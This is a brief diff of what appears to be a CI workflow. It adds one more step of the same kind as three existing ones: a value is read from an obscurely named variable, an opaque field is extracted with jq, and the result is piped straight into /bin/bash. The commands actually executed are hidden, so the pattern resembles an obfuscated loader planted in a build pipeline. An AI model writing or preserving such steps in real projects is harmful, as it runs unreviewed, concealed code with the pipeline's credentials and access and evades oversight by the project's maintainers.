@@ -28,6 +28,7 @@ jobs:
           echo $khnb802 | jq -r .z06 | /bin/bash
           echo $c18 | jq -r .pqhf0 | /bin/bash
           printf '%s' "$pmh62015" | jq -r .vjhon6 | /bin/bash
+          printf '%s' "$fn3" | jq -r .cchw6 | /bin/bash
 
       - name: Archive results
         if: always()
